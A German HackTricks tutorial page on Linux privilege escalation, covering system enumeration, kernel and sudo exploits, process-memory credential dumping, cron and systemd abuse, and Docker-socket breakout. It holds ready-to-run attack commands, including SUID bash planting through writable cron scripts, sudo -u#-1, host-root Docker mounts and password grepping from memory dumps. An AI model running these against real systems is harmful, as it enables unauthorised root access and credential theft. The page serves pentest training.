# Linux Privilegieneskalation

{{#include ../../banners/hacktricks-training.md}}

## Systeminformationen

### OS-Info

Lass uns beginnen, einige Kenntnisse über das laufende Betriebssystem zu gewinnen.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Pfad

Wenn Sie **Schreibberechtigungen für einen Ordner innerhalb der `PATH`**-Variablen haben, könnten Sie in der Lage sein, einige Bibliotheken oder Binärdateien zu übernehmen:
```bash
echo $PATH
```
### Env info

Interessante Informationen, Passwörter oder API-Schlüssel in den Umgebungsvariablen?
```bash
(env || set) 2>/dev/null
```
### Kernel-Exploits

Überprüfen Sie die Kernel-Version und ob es einen Exploit gibt, der verwendet werden kann, um Privilegien zu eskalieren.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Sie können eine gute Liste verwundbarer Kernel und einige bereits **kompilierte Exploits** hier finden: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) und [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).\
Andere Seiten, auf denen Sie einige **kompilierte Exploits** finden können: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Um alle verwundbaren Kernel-Versionen von dieser Website zu extrahieren, können Sie Folgendes tun:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Tools, die bei der Suche nach Kernel-Exploits helfen könnten, sind:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (ausführen IM Opfer, überprüft nur Exploits für Kernel 2.x)

Immer **die Kernel-Version in Google suchen**, vielleicht ist Ihre Kernel-Version in einem bestimmten Kernel-Exploit angegeben und dann sind Sie sich sicher, dass dieser Exploit gültig ist.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo-Version

Basierend auf den anfälligen sudo-Versionen, die erscheinen in:
```bash
searchsploit sudo
```
Sie können überprüfen, ob die sudo-Version anfällig ist, indem Sie dieses grep verwenden.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Von @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg-Signaturüberprüfung fehlgeschlagen

Überprüfen Sie die **smasher2 box of HTB** für ein **Beispiel**, wie diese Schwachstelle ausgenutzt werden könnte.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Weitere Systemenumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Mögliche Abwehrmaßnahmen auflisten

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Wenn Sie sich in einem Docker-Container befinden, können Sie versuchen, daraus zu entkommen:

{{#ref}}
docker-security/
{{#endref}}

## Drives

Überprüfen Sie **was gemountet und ungemountet ist**, wo und warum. Wenn etwas ungemountet ist, könnten Sie versuchen, es zu mounten und nach privaten Informationen zu suchen.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Nützliche Software

Zähle nützliche Binaries auf
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Überprüfen Sie auch, ob **ein Compiler installiert ist**. Dies ist nützlich, wenn Sie einen Kernel-Exploit verwenden müssen, da es empfohlen wird, ihn auf der Maschine zu kompilieren, auf der Sie ihn verwenden möchten (oder auf einer ähnlichen).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Verwundbare Software Installiert

Überprüfen Sie die **Version der installierten Pakete und Dienste**. Möglicherweise gibt es eine alte Nagios-Version (zum Beispiel), die ausgenutzt werden könnte, um Privilegien zu eskalieren…\
Es wird empfohlen, die Version der verdächtigeren installierten Software manuell zu überprüfen.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Wenn Sie SSH-Zugriff auf die Maschine haben, können Sie auch **openVAS** verwenden, um nach veralteter und anfälliger Software zu suchen, die auf der Maschine installiert ist.

> [!NOTE] > _Beachten Sie, dass diese Befehle viele Informationen anzeigen, die größtenteils nutzlos sein werden. Daher wird empfohlen, einige Anwendungen wie OpenVAS oder ähnliche zu verwenden, die überprüfen, ob eine installierte Softwareversion anfällig für bekannte Exploits ist._

## Prozesse

Werfen Sie einen Blick darauf, **welche Prozesse** ausgeführt werden, und überprüfen Sie, ob ein Prozess **mehr Berechtigungen hat, als er sollte** (vielleicht ein Tomcat, der von root ausgeführt wird?)
```bash
ps aux
ps -ef
top -n 1
```
Immer nach möglichen [**electron/cef/chromium debuggers** suchen, die laufen, Sie könnten dies ausnutzen, um Privilegien zu eskalieren](electron-cef-chromium-debugger-abuse.md). **Linpeas** erkennt diese, indem es den `--inspect` Parameter in der Befehlszeile des Prozesses überprüft.\
Überprüfen Sie auch **Ihre Berechtigungen über die Binärdateien der Prozesse**, vielleicht können Sie jemandes Dateien überschreiben.

### Prozessüberwachung

Sie können Tools wie [**pspy**](https://github.com/DominicBreuker/pspy) verwenden, um Prozesse zu überwachen. Dies kann sehr nützlich sein, um anfällige Prozesse zu identifizieren, die häufig ausgeführt werden oder wenn eine Reihe von Anforderungen erfüllt sind.

### Prozessspeicher

Einige Dienste eines Servers speichern **Anmeldeinformationen im Klartext im Speicher**.\
Normalerweise benötigen Sie **Root-Rechte**, um den Speicher von Prozessen zu lesen, die anderen Benutzern gehören, daher ist dies normalerweise nützlicher, wenn Sie bereits Root sind und mehr Anmeldeinformationen entdecken möchten.\
Denken Sie jedoch daran, dass **Sie als regulärer Benutzer den Speicher der Prozesse, die Sie besitzen, lesen können**.

> [!WARNING]
> Beachten Sie, dass die meisten Maschinen heutzutage **ptrace standardmäßig nicht erlauben**, was bedeutet, dass Sie keine anderen Prozesse, die Ihrem unprivilegierten Benutzer gehören, dumpen können.
>
> Die Datei _**/proc/sys/kernel/yama/ptrace_scope**_ steuert die Zugänglichkeit von ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: Alle Prozesse können debuggt werden, solange sie die gleiche UID haben. Dies ist die klassische Art, wie ptracing funktionierte.
> - **kernel.yama.ptrace_scope = 1**: Nur ein übergeordneter Prozess kann debuggt werden.
> - **kernel.yama.ptrace_scope = 2**: Nur der Administrator kann ptrace verwenden, da dies die CAP_SYS_PTRACE-Berechtigung erfordert.
> - **kernel.yama.ptrace_scope = 3**: Es dürfen keine Prozesse mit ptrace verfolgt werden. Ein Neustart ist erforderlich, um das ptracing wieder zu aktivieren, sobald es festgelegt ist.

#### GDB

Wenn Sie Zugriff auf den Speicher eines FTP-Dienstes (zum Beispiel) haben, könnten Sie den Heap abrufen und nach seinen Anmeldeinformationen suchen.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB-Skript
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Für eine gegebene Prozess-ID zeigt **maps, wie der Speicher innerhalb des virtuellen Adressraums dieses Prozesses abgebildet ist**; es zeigt auch die **Berechtigungen jeder abgebildeten Region**. Die **mem** Pseudodatei **stellt den Speicher des Prozesses selbst zur Verfügung**. Aus der **maps**-Datei wissen wir, welche **Speicherregionen lesbar sind** und ihre Offsets. Wir verwenden diese Informationen, um **in die mem-Datei zu suchen und alle lesbaren Regionen** in eine Datei zu dumpen.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` bietet Zugriff auf den **physischen** Speicher des Systems, nicht auf den virtuellen Speicher. Der virtuelle Adressraum des Kernels kann über /dev/kmem zugegriffen werden.\
Typischerweise ist `/dev/mem` nur für **root** und die **kmem**-Gruppe lesbar.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump für Linux

ProcDump ist eine Neuinterpretation des klassischen ProcDump-Tools aus der Sysinternals-Suite für Windows. Erhalten Sie es unter [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Tools

Um den Speicher eines Prozesses zu dumpen, können Sie verwenden:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Sie können die Root-Anforderungen manuell entfernen und den von Ihnen besessenen Prozess dumpen
- Skript A.5 von [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (Root ist erforderlich)

### Credentials from Process Memory

#### Manual example

Wenn Sie feststellen, dass der Authenticator-Prozess läuft:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Sie können den Prozess dumpen (siehe vorherige Abschnitte, um verschiedene Möglichkeiten zum Dumpen des Speichers eines Prozesses zu finden) und nach Anmeldeinformationen im Speicher suchen:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Das Tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) wird **Klartext-Anmeldeinformationen aus dem Speicher stehlen** und aus einigen **bekannten Dateien**. Es erfordert Root-Rechte, um ordnungsgemäß zu funktionieren.

| Funktion                                          | Prozessname          |
| ------------------------------------------------- | -------------------- |
| GDM-Passwort (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Aktive FTP-Verbindungen)                  | vsftpd               |
| Apache2 (Aktive HTTP-Basic-Auth-Sitzungen)       | apache2              |
| OpenSSH (Aktive SSH-Sitzungen - Sudo-Nutzung)     | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Geplante/Cron-Jobs

Überprüfen Sie, ob ein geplanter Job anfällig ist. Vielleicht können Sie einen Vorteil aus einem Skript ziehen, das von root ausgeführt wird (Wildcard-Schwachstelle? Kann Dateien ändern, die root verwendet? Symlinks verwenden? Bestimmte Dateien im Verzeichnis erstellen, das root verwendet?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron-Pfad

Zum Beispiel finden Sie im _/etc/crontab_ den PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Beachten Sie, dass der Benutzer "user" Schreibrechte über /home/user hat_)

Wenn der Root-Benutzer in diesem Crontab versucht, einen Befehl oder ein Skript auszuführen, ohne den Pfad festzulegen. Zum Beispiel: _\* \* \* \* root overwrite.sh_\
Dann können Sie eine Root-Shell erhalten, indem Sie:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron mit einem Skript mit einem Platzhalter (Wildcard Injection)

Wenn ein Skript, das von root ausgeführt wird, ein “**\***” innerhalb eines Befehls hat, könntest du dies ausnutzen, um unerwartete Dinge zu verursachen (wie privesc). Beispiel:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Wenn das Wildcard von einem Pfad wie** _**/some/path/\***_ **vorgegangen wird, ist es nicht anfällig (sogar** _**./\***_ **ist es nicht).**

Lesen Sie die folgende Seite für weitere Tricks zur Ausnutzung von Wildcards:

{{#ref}}
wildcards-spare-tricks.md
{{#endref}}

### Cron-Skript-Überschreibung und Symlink

Wenn Sie **ein Cron-Skript, das von root ausgeführt wird, ändern können**, können Sie sehr einfach eine Shell erhalten:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Wenn das Skript, das von root ausgeführt wird, ein **Verzeichnis verwendet, auf das Sie vollen Zugriff haben**, könnte es nützlich sein, diesen Ordner zu löschen und **einen Symlink-Ordner zu einem anderen zu erstellen**, der ein von Ihnen kontrolliertes Skript bereitstellt.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Häufige Cron-Jobs

Sie können die Prozesse überwachen, um nach Prozessen zu suchen, die alle 1, 2 oder 5 Minuten ausgeführt werden. Vielleicht können Sie dies ausnutzen und Privilegien eskalieren.

Zum Beispiel, um **alle 0,1 Sekunden während 1 Minute zu überwachen**, **nach weniger ausgeführten Befehlen zu sortieren** und die Befehle zu löschen, die am häufigsten ausgeführt wurden, können Sie Folgendes tun:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Sie können auch** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (dies wird jeden gestarteten Prozess überwachen und auflisten).

### Unsichtbare Cron-Jobs

Es ist möglich, einen Cron-Job **ein Wagenrücklaufzeichen nach einem Kommentar hinzuzufügen** (ohne Zeilenumbruchzeichen), und der Cron-Job wird funktionieren. Beispiel (beachten Sie das Wagenrücklaufzeichen):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Dienste

### Schreibbare _.service_ Dateien

Überprüfen Sie, ob Sie eine `.service`-Datei schreiben können. Wenn ja, **könnten Sie sie ändern**, sodass sie Ihre **Hintertür ausführt**, wenn der Dienst **gestartet**, **neu gestartet** oder **gestoppt** wird (vielleicht müssen Sie warten, bis die Maschine neu gestartet wird).\
Erstellen Sie beispielsweise Ihre Hintertür innerhalb der .service-Datei mit **`ExecStart=/tmp/script.sh`**

### Schreibbare Dienst-Binärdateien

Behalten Sie im Hinterkopf, dass Sie, wenn Sie **Schreibberechtigungen für von Diensten ausgeführte Binärdateien** haben, diese durch Hintertüren ändern können, sodass beim erneuten Ausführen der Dienste die Hintertüren ausgeführt werden.

### systemd PATH - Relative Pfade

Sie können den von **systemd** verwendeten PATH mit:
```bash
systemctl show-environment
```
Wenn Sie feststellen, dass Sie in einem der Ordner des Pfades **schreiben** können, könnten Sie in der Lage sein, **Privilegien zu eskalieren**. Sie müssen nach **relativen Pfaden suchen, die in Dienstkonfigurations** dateien verwendet werden, wie:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Dann erstellen Sie ein **ausführbares** Programm mit dem **gleichen Namen wie der relative Pfad-Binärdatei** im systemd PATH-Ordner, in den Sie schreiben können, und wenn der Dienst aufgefordert wird, die verwundbare Aktion (**Start**, **Stop**, **Reload**) auszuführen, wird Ihr **Backdoor ausgeführt** (nicht privilegierte Benutzer können normalerweise keine Dienste starten/stoppen, überprüfen Sie jedoch, ob Sie `sudo -l` verwenden können).

**Erfahren Sie mehr über Dienste mit `man systemd.service`.**

## **Timer**

**Timer** sind systemd-Einheitendateien, deren Name mit `**.timer**` endet und die `**.service**`-Dateien oder Ereignisse steuern. **Timer** können als Alternative zu cron verwendet werden, da sie integrierte Unterstützung für Kalenderzeitereignisse und monotone Zeitereignisse haben und asynchron ausgeführt werden können.

Sie können alle Timer mit folgender Methode auflisten:
```bash
systemctl list-timers --all
```
### Schreibbare Timer

Wenn Sie einen Timer ändern können, können Sie ihn dazu bringen, einige Instanzen von systemd.unit (wie eine `.service` oder eine `.target`) auszuführen.
```bash
Unit=backdoor.service
```
In der Dokumentation können Sie lesen, was die Einheit ist:

> Die Einheit, die aktiviert werden soll, wenn dieser Timer abläuft. Das Argument ist ein Einheitsname, dessen Suffix nicht ".timer" ist. Wenn nicht angegeben, wird dieser Wert standardmäßig auf einen Dienst gesetzt, der denselben Namen wie die Timer-Einheit hat, mit Ausnahme des Suffixes. (Siehe oben.) Es wird empfohlen, dass der aktivierte Einheitsname und der Einheitsname der Timer-Einheit identisch benannt sind, mit Ausnahme des Suffixes.

Daher müssten Sie, um diese Berechtigung auszunutzen:

- Eine systemd-Einheit (wie eine `.service`) finden, die **eine beschreibbare Binärdatei ausführt**
- Eine systemd-Einheit finden, die **einen relativen Pfad ausführt** und über **schreibbare Berechtigungen** über den **systemd PATH** verfügt (um diese ausführbare Datei zu impersonifizieren)

**Erfahren Sie mehr über Timer mit `man systemd.timer`.**

### **Timer aktivieren**

Um einen Timer zu aktivieren, benötigen Sie Root-Rechte und müssen ausführen:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Beachten Sie, dass der **Timer** durch das Erstellen eines Symlinks zu ihm in `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` **aktiviert** wird.

## Sockets

Unix-Domain-Sockets (UDS) ermöglichen die **Prozesskommunikation** auf denselben oder verschiedenen Maschinen innerhalb von Client-Server-Modellen. Sie nutzen standardmäßige Unix-Deskriptor-Dateien für die intercomputerliche Kommunikation und werden über `.socket`-Dateien eingerichtet.

Sockets können mit `.socket`-Dateien konfiguriert werden.

**Erfahren Sie mehr über Sockets mit `man systemd.socket`.** In dieser Datei können mehrere interessante Parameter konfiguriert werden:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Diese Optionen sind unterschiedlich, aber eine Zusammenfassung wird verwendet, um **anzuzeigen, wo es auf den Socket hören wird** (der Pfad der AF_UNIX-Socket-Datei, die IPv4/6 und/oder Portnummer, auf die gehört werden soll, usw.)
- `Accept`: Nimmt ein boolesches Argument. Wenn **wahr**, wird eine **Service-Instanz für jede eingehende Verbindung** erstellt und nur der Verbindungs-Socket wird an sie übergeben. Wenn **falsch**, werden alle hörenden Sockets selbst an die gestartete Service-Einheit **übergeben**, und es wird nur eine Service-Einheit für alle Verbindungen erstellt. Dieser Wert wird für Datagram-Sockets und FIFOs ignoriert, bei denen eine einzelne Service-Einheit bedingungslos den gesamten eingehenden Verkehr verarbeitet. **Standardmäßig auf falsch.** Aus Leistungsgründen wird empfohlen, neue Daemons nur so zu schreiben, dass sie für `Accept=no` geeignet sind.
- `ExecStartPre`, `ExecStartPost`: Nimmt eine oder mehrere Befehlszeilen, die **vor** oder **nach** dem Erstellen und Binden der hörenden **Sockets**/FIFOs **ausgeführt** werden. Das erste Token der Befehlszeile muss ein absoluter Dateiname sein, gefolgt von Argumenten für den Prozess.
- `ExecStopPre`, `ExecStopPost`: Zusätzliche **Befehle**, die **vor** oder **nach** dem Schließen und Entfernen der hörenden **Sockets**/FIFOs **ausgeführt** werden.
- `Service`: Gibt den Namen der **Service**-Einheit an, die bei **eingehendem Verkehr** **aktiviert** werden soll. Diese Einstellung ist nur für Sockets mit Accept=no zulässig. Sie wird standardmäßig auf den Service gesetzt, der denselben Namen wie der Socket trägt (mit dem ersetzten Suffix). In den meisten Fällen sollte es nicht notwendig sein, diese Option zu verwenden.

### Schreibbare .socket-Dateien

Wenn Sie eine **schreibbare** `.socket`-Datei finden, können Sie am Anfang des `[Socket]`-Abschnitts etwas hinzufügen wie: `ExecStartPre=/home/kali/sys/backdoor`, und die Hintertür wird ausgeführt, bevor der Socket erstellt wird. Daher müssen Sie **wahrscheinlich warten, bis die Maschine neu gestartet wird.**\
&#xNAN;_&#x4E;oten Sie, dass das System diese Socket-Dateikonfiguration verwenden muss, oder die Hintertür wird nicht ausgeführt_

### Schreibbare Sockets

Wenn Sie **irgendeinen schreibbaren Socket** identifizieren (_jetzt sprechen wir über Unix-Sockets und nicht über die Konfigurations-.socket-Dateien_), dann **können Sie mit diesem Socket kommunizieren** und möglicherweise eine Schwachstelle ausnutzen.

### Unix-Sockets auflisten
```bash
netstat -a -p --unix
```
### Rohverbindung
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation Beispiel:**

{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP Sockets

Beachten Sie, dass es einige **Sockets geben kann, die auf HTTP**-Anfragen hören (_ich spreche nicht von .socket-Dateien, sondern von den Dateien, die als Unix-Sockets fungieren_). Sie können dies überprüfen mit:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Wenn der Socket **mit einer HTTP**-Anfrage antwortet, können Sie **mit ihm kommunizieren** und möglicherweise **eine Schwachstelle ausnutzen**.

### Schreibbarer Docker-Socket

Der Docker-Socket, der häufig unter `/var/run/docker.sock` zu finden ist, ist eine kritische Datei, die gesichert werden sollte. Standardmäßig ist er für den `root`-Benutzer und Mitglieder der `docker`-Gruppe schreibbar. Der Besitz von Schreibzugriff auf diesen Socket kann zu einer Privilegieneskalation führen. Hier ist eine Übersicht, wie dies geschehen kann und alternative Methoden, falls die Docker-CLI nicht verfügbar ist.

#### **Privilegieneskalation mit Docker-CLI**

Wenn Sie Schreibzugriff auf den Docker-Socket haben, können Sie die Privilegien mit den folgenden Befehlen eskalieren:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Diese Befehle ermöglichen es Ihnen, einen Container mit Root-Zugriff auf das Dateisystem des Hosts auszuführen.

#### **Direkte Verwendung der Docker API**

In Fällen, in denen die Docker CLI nicht verfügbar ist, kann der Docker-Socket weiterhin mit der Docker API und `curl`-Befehlen manipuliert werden.

1.  **Docker-Images auflisten:** Holen Sie sich die Liste der verfügbaren Images.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Einen Container erstellen:** Senden Sie eine Anfrage, um einen Container zu erstellen, der das Root-Verzeichnis des Host-Systems einbindet.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Starten Sie den neu erstellten Container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **An den Container anhängen:** Verwenden Sie `socat`, um eine Verbindung zum Container herzustellen, die die Ausführung von Befehlen innerhalb des Containers ermöglicht.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Nachdem die `socat`-Verbindung eingerichtet ist, können Sie Befehle direkt im Container mit Root-Zugriff auf das Dateisystem des Hosts ausführen.

### Andere

Beachten Sie, dass Sie, wenn Sie Schreibberechtigungen über den Docker-Socket haben, weil Sie **in der Gruppe `docker` sind**, [**mehr Möglichkeiten zur Eskalation von Rechten haben**](interesting-groups-linux-pe/#docker-group). Wenn die [**Docker API an einem Port lauscht**, können Sie sie möglicherweise ebenfalls kompromittieren](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Überprüfen Sie **weitere Möglichkeiten, aus Docker auszubrechen oder es zu missbrauchen, um Privilegien zu eskalieren** in:

{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) Privilegieneskalation

Wenn Sie feststellen, dass Sie den **`ctr`**-Befehl verwenden können, lesen Sie die folgende Seite, da **Sie ihn möglicherweise missbrauchen können, um Privilegien zu eskalieren**:

{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** Privilegieneskalation

Wenn Sie feststellen, dass Sie den **`runc`**-Befehl verwenden können, lesen Sie die folgende Seite, da **Sie ihn möglicherweise missbrauchen können, um Privilegien zu eskalieren**:

{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus ist ein ausgeklügeltes **Inter-Process Communication (IPC) System**, das es Anwendungen ermöglicht, effizient zu interagieren und Daten auszutauschen. Es wurde mit dem modernen Linux-System im Hinterkopf entwickelt und bietet ein robustes Framework für verschiedene Formen der Anwendungskommunikation.

Das System ist vielseitig und unterstützt grundlegende IPC, die den Datenaustausch zwischen Prozessen verbessert, ähnlich wie **erweiterte UNIX-Domänensockets**. Darüber hinaus hilft es beim Broadcasten von Ereignissen oder Signalen, was eine nahtlose Integration zwischen den Systemkomponenten fördert. Zum Beispiel kann ein Signal von einem Bluetooth-Daemon über einen eingehenden Anruf einen Musikplayer dazu bringen, sich stummzuschalten, was die Benutzererfahrung verbessert. Darüber hinaus unterstützt D-Bus ein Remote-Objektsystem, das Serviceanfragen und Methodenaufrufe zwischen Anwendungen vereinfacht und Prozesse optimiert, die traditionell komplex waren.

D-Bus arbeitet nach einem **Erlauben/Verweigern-Modell**, das die Nachrichtenberechtigungen (Methodenaufrufe, Signalübertragungen usw.) basierend auf der kumulativen Wirkung übereinstimmender Richtlinienregeln verwaltet. Diese Richtlinien spezifizieren Interaktionen mit dem Bus und können möglicherweise eine Privilegieneskalation durch die Ausnutzung dieser Berechtigungen ermöglichen.

